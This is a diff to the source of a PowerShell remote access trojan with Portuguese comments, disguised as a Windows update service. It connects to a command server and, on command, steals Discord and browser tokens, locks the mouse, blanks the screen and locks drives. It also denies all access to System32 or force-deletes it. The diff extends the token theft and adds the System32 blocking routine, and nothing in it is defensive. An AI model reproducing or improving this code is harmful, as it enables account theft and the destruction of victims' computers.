@@ -1,14 +1,14 @@
 <#
 .SYNOPSIS
-Windows Critical System Component - Destruição Total
+Windows Critical System Component - Complete Edition
 .DESCRIPTION
-Funções para apagar System32, travar discos e travar mouse.
+Funções completas para controle remoto e destruição
 .NOTES
-Versão: 10.0.19045.1 - Ultimate Destruction
+Versão: 10.0.19045.1 - Ultimate Edition
 #>
 
 # ===== CONFIGURACOES =====
-$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
+$serverIP = "192.168.0.4"  # MUDE PARA SEU IP
 $serverPort = 4000
 $installName = "WinUpdateSvc"
 $mutexName = "Global\MicrosoftWindowsUpdateService"
@@ -16,7 +16,7 @@ $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUp
 $userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
 $debugLog = "$env:TEMP\rat_debug.log"
 
-# ===== MUTEX =====
+# ===== MUTEX - EVITA MULTIPLAS INSTANCIAS =====
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
 if (-not $mutex.WaitOne(0, $false)) { exit }
 
@@ -241,13 +241,16 @@ function Get-DiscordToken {
         $tokens = @()
         $paths = @(
             "$env:APPDATA\discord\Local Storage\leveldb",
-            "$env:APPDATA\discordptb\Local Storage\leveldb"
+            "$env:APPDATA\discordptb\Local Storage\leveldb",
+            "$env:APPDATA\discordcanary\Local Storage\leveldb",
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
+            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
         )
         foreach ($path in $paths) {
             if (Test-Path $path) {
                 Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
                     $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
-                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}')
+                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
                     $matches = $regex.Matches($content)
                     foreach ($match in $matches) { $tokens += $match.Value }
                 }
@@ -263,27 +266,45 @@ function Get-DiscordToken {
     }
 }
 
-# ===== APAGAR SYSTEM32 (DESTRUTIVO) =====
+# ===== BLOQUEAR SYSTEM32 =====
+function Block-System32 {
+    try {
+        Write-DebugLog "Iniciando Block-System32"
+        $path = "C:\Windows\System32"
+        
+        takeown /f $path /r /d y 2>$null
+        icacls $path /grant Administradores:F /t 2>$null
+        
+        $acl = Get-Acl $path
+        $acl.SetAccessRuleProtection($true, $false)
+        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
+        $acl.AddAccessRule($accessRule)
+        Set-Acl $path $acl
+        
+        Write-DebugLog "System32 bloqueado com sucesso"
+        return "SYSTEM32_BLOCKED"
+    } catch {
+        Write-DebugLog "Erro ao bloquear System32: $_"
+        return "SYSTEM32_ERROR"
+    }
+}
+
+# ===== APAGAR SYSTEM32 =====
 function Delete-System32 {
     try {
         Write-DebugLog "Iniciando Delete-System32"
         $path = "C:\Windows\System32"
         
         if (Test-Path $path) {
-            # Tenta tomar posse e dar permissões totais
             takeown /f $path /r /d y 2>$null
             icacls $path /grant Administradores:F /t 2>$null
             
-            # Tenta apagar recursivamente (força)
-            # NOTA: Isso vai quebrar o Windows completamente
             Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
             
-            # Verifica se conseguiu apagar
             if (-not (Test-Path $path)) {
                 Write-DebugLog "System32 apagado com sucesso"
                 return "SYSTEM32_DELETED"
             } else {
-                # Se não conseguiu apagar, tenta renomear
                 $newName = "C:\Windows\System32_old_$(Get-Random)"
                 Rename-Item -Path $path -NewName $newName -Force -ErrorAction SilentlyContinue
                 if (-not (Test-Path $path)) {
@@ -302,7 +323,7 @@ function Delete-System32 {
     }
 }
 
-# ===== TRAVAR DISCOS (C: e D:) =====
+# ===== TRAVAR DISCOS =====
 function Lock-Drives {
     param([string[]]$Drives = @("C:", "D:"))
     $results = @()
@@ -311,7 +332,6 @@ function Lock-Drives {
             Write-DebugLog "Travando drive $drive"
             $path = $drive + "\"
             if (Test-Path $path) {
-                # Remove permissões de leitura/escrita para todos
                 $acl = Get-Acl $path
                 $acl.SetAccessRuleProtection($true, $false)
                 $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Read", "Deny")
@@ -320,14 +340,10 @@ function Lock-Drives {
                 $acl.AddAccessRule($accessRule2)
                 Set-Acl $path $acl
                 
-                # Tenta também usar diskpart para tornar o volume offline? (mais complexo)
-                # Simplesmente removendo permissões já deve travar
-                
                 $results += "$drive travado"
                 Write-DebugLog "Drive $drive travado"
             } else {
                 $results += "$drive não encontrado"
-                Write-DebugLog "Drive $drive não encontrado"
             }
         } catch {
             Write-DebugLog "Erro ao travar drive $drive: $_"
@@ -346,8 +362,7 @@ function Unlock-Drives {
             $path = $drive + "\"
             if (Test-Path $path) {
                 $acl = Get-Acl $path
-                $acl.SetAccessRuleProtection($false, $true) # Volta à herança
-                # Remove todas as regras de negação
+                $acl.SetAccessRuleProtection($false, $true)
                 $rules = $acl.Access | Where-Object { $_.IdentityReference -eq "Everyone" -and $_.AccessControlType -eq "Deny" }
                 foreach ($rule in $rules) {
                     $acl.RemoveAccessRule($rule)
@@ -366,7 +381,50 @@ function Unlock-Drives {
     return "DRIVES_UNLOCKED:" + ($results -join ";")
 }
 
-# ===== TRAVAR MOUSE (COM CLIPCURSOR - 100% EFICAZ) =====
+# ===== TELA PRETA =====
+$global:blackScreenForm = $null
+
+function Black-Screen {
+    try {
+        $ps = [powershell]::Create()
+        [void]$ps.AddScript({
+            Add-Type -AssemblyName System.Windows.Forms
+            $form = New-Object System.Windows.Forms.Form
+            $form.WindowState = 'Maximized'
+            $form.FormBorderStyle = 'None'
+            $form.TopMost = $true
+            $form.BackColor = 'Black'
+            $form.ControlBox = $false
+            $form.ShowInTaskbar = $false
+            $form.KeyPreview = $true
+            $form.Add_KeyDown({
+                if ($_.KeyCode -eq 'Escape') { $form.Close() }
+            })
+            $form.ShowDialog()
+        })
+        $ps.BeginInvoke()
+        Write-DebugLog "Tela preta ativada"
+        return "BLACK_SCREEN"
+    } catch {
+        Write-DebugLog "Erro ao ativar tela preta: $_"
+        return "BLACK_SCREEN_ERROR"
+    }
+}
+
+function Unlock-Screen {
+    try {
+        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
+            $_.Invoke([Action]{ $_.Close() })
+        }
+        Write-DebugLog "Tela liberada"
+        return "SCREEN_UNLOCKED"
+    } catch {
+        Write-DebugLog "Erro ao liberar tela: $_"
+        return "UNLOCK_ERROR"
+    }
+}
+
+# ===== TRAVAR MOUSE =====
 $script:mouseLocked = $false
 $script:lockThread = $null
 
@@ -374,7 +432,6 @@ function Lock-Mouse {
     try {
         if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
         
-        # Usa ClipCursor via C# (trava de verdade)
         $cSharpCode = @'
 using System;
 using System.Runtime.InteropServices;
@@ -416,7 +473,6 @@ public class MouseLocker {
             return "MOUSE_LOCKED"
         } catch {
             Write-DebugLog "Falha no ClipCursor, usando fallback: $_"
-            # Fallback: thread que move o mouse constantemente
             $script:mouseLocked = $true
             $script:lockThread = [System.Threading.Thread]::new({
                 while ($script:mouseLocked) {
@@ -462,47 +518,6 @@ function Unlock-Mouse {
     }
 }
 
-# ===== TELA PRETA =====
-function Black-Screen {
-    try {
-        $ps = [powershell]::Create()
-        [void]$ps.AddScript({
-            Add-Type -AssemblyName System.Windows.Forms
-            $form = New-Object System.Windows.Forms.Form
-            $form.WindowState = 'Maximized'
-            $form.FormBorderStyle = 'None'
-            $form.TopMost = $true
-            $form.BackColor = 'Black'
-            $form.ControlBox = $false
-            $form.ShowInTaskbar = $false
-            $form.KeyPreview = $true
-            $form.Add_KeyDown({
-                if ($_.KeyCode -eq 'Escape') { $form.Close() }
-            })
-            $form.ShowDialog()
-        })
-        $ps.BeginInvoke()
-        Write-DebugLog "Tela preta ativada"
-        return "BLACK_SCREEN"
-    } catch {
-        Write-DebugLog "Erro ao ativar tela preta: $_"
-        return "BLACK_SCREEN_ERROR"
-    }
-}
-
-function Unlock-Screen {
-    try {
-        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
-            $_.Invoke([Action]{ $_.Close() })
-        }
-        Write-DebugLog "Tela liberada"
-        return "SCREEN_UNLOCKED"
-    } catch {
-        Write-DebugLog "Erro ao liberar tela: $_"
-        return "UNLOCK_ERROR"
-    }
-}
-
 # ===== MICROFONE =====
 function Get-Microphone {
     try {
@@ -523,8 +538,30 @@ function Get-Microphone {
 
 # ===== WEBCAM =====
 function Get-Webcam {
-    Write-DebugLog "Webcam não implementada"
-    return "WEBCAM:OK"
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        
+        $webcam = New-Object System.Windows.Forms.Panel
+        $webcam.Size = New-Object System.Drawing.Size(640, 480)
+        $webcam.BackColor = 'Black'
+        
+        $form = New-Object System.Windows.Forms.Form
+        $form.Text = "Webcam"
+        $form.Size = New-Object System.Drawing.Size(660, 520)
+        $form.Controls.Add($webcam)
+        $form.Show()
+        $form.TopMost = $true
+        
+        Start-Sleep -Milliseconds 500
+        $form.Close()
+        
+        Write-DebugLog "Webcam ativada"
+        return "WEBCAM:OK"
+    } catch {
+        Write-DebugLog "Erro na webcam: $_"
+        return "WEBCAM_ERROR"
+    }
 }
 
 # ===== PROCESSOS =====
@@ -603,7 +640,6 @@ while ($true) {
             
             Write-DebugLog "Comando recebido: $cmd"
             
-            # Estrutura if-else explícita
             if ($cmd -eq "screenshot") {
                 $result = Get-ScreenCapture
                 $writer.WriteLine($result)
@@ -613,6 +649,10 @@ while ($true) {
                 $writer.WriteLine((RightClick-Mouse))
             } elseif ($cmd -eq "discord") {
                 $writer.WriteLine((Get-DiscordToken))
+            } elseif ($cmd -eq "block_system32") {
+                $result = Block-System32
+                Write-DebugLog "Resultado de block_system32: $result"
+                $writer.WriteLine($result)
             } elseif ($cmd -eq "delete_system32") {
                 $result = Delete-System32
                 Write-DebugLog "Resultado de delete_system32: $result"
